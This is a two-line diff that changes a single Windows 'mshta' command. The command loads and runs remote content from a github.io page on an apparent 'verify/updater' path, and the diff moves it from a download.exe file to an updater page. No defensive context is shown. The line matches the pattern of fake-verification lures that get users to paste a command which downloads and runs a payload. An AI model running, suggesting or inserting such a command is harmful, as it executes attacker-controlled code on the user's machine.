@@ -1,1 +1,1 @@
-mshta https://puppy38.github.io/verify/updater/download.exe
+mshta https://puppy38.github.io/updater/
